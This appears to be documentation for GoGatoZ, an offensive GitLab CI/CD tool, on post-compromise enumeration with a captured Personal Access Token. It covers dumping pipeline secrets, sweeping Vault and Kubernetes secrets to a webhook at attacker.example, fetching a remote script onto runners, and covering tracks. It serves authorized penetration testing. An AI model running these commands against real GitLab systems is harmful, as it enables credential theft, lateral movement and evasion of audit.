---
title: Post-Compromise Enumeration
description: Enumerate resources after obtaining a GitLab Personal Access Token
---

This guide explains how to use GoGatoZ for post-compromise enumeration after obtaining a GitLab Personal Access Token (PAT).

> **Note**: This guide is intended for authorized security testing only. Always ensure you have proper permission before using these techniques.

## Overview

If you obtain a GitLab PAT during a security assessment or penetration test, GoGatoZ can help you:

1. Validate the token and identify its permissions
2. Enumerate accessible projects and groups
3. Identify projects with CI/CD pipelines
4. Discover accessible secrets
5. Find potential privilege escalation paths

## Validating a Token

To validate a token and see accessible projects:

```bash
export GITLAB_TOKEN=<the_token>
gogatoz search --json
```

This will show all projects accessible to the token.

## Enumerating CI/CD Configurations

To perform comprehensive enumeration of CI/CD configurations across all accessible projects:

```bash
# List all accessible projects
gogatoz search --max-pages 0 --json | jq -r '.[].path_with_namespace' > all_projects.txt

# Enumerate for vulnerabilities
gogatoz enumerate -i all_projects.txt -c 16 --json | tee enum_results.json
```

## Extracting Secrets

If you have write access to a project with a self-hosted runner:

```bash
gogatoz attack --secrets --target group/project --tags shell
```

This will:
1. Create a new branch in the project
2. Push a CI pipeline that dumps environment variables
3. Execute the pipeline on the runner
4. Retrieve the secrets from the pipeline artifacts

### Vault Secret Enumeration

If the target project's CI pipelines authenticate to HashiCorp Vault (common in enterprise environments), enumerate reachable secrets using the CI job's JWT/OIDC identity:

```bash
gogatoz attack --vault-enum --target group/project \
  --vault-addr https://vault.internal:8200 --vault-auth-method jwt \
  --tags shell
```

This discovers secret engines and reads key-value pairs accessible to the CI job's Vault role. Look for database credentials, API keys, and cloud provider secrets.

### Kubernetes Secret Sweep

When runners execute inside Kubernetes or have access to a kubeconfig, sweep secrets from accessible namespaces:

```bash
gogatoz attack --k8s-secrets --target group/project \
  --k8s-namespaces default,production,staging \
  --tags kubernetes --webhook https://attacker.example/k8s
```

The sweep uses the runner's service account token to list and read secrets. Common finds include TLS certificates, registry pull secrets, database connection strings, and additional service account tokens for lateral movement.

## Privilege Escalation

### Finding Vulnerable Configurations

To identify configurations that might allow privilege escalation:

```bash
gogatoz enumerate -i all_projects.txt --only-findings --json | \
  jq '.[] | select(.findings[] | .severity == "HIGH")'
```

Look for:
- Jobs with `merge_request_event` triggers on self-hosted runners
- Variable injection vulnerabilities
- Unpinned remote includes

## Lateral Movement

### Identifying Connected Projects

Look for:
- Projects that use shared CI templates from repositories you control
- Groups where you have access to some but not all projects
- Projects with exposed CI/CD variables

### Accessing Self-Hosted Runners

If you identify accessible self-hosted runners, you can attempt to compromise them:

```bash
gogatoz attack --commit-ci --target group/project \
  --payload ror --script-url https://attacker/p.sh --tags shell
```

## Covering Your Tracks

To minimize detection:

- Use the `--cleanup` flag to remove attack branches after exploitation
- Remove any branches you created: `gogatoz attack --target group/project --cleanup --cleanup-branch gogatoz-attack`
- Be mindful of audit logs that record your actions

## Reporting

When conducting authorized security assessments:

1. Document all findings thoroughly
2. Include evidence of access without including actual secrets
3. Provide clear remediation recommendations
4. Follow the organization's reporting procedures
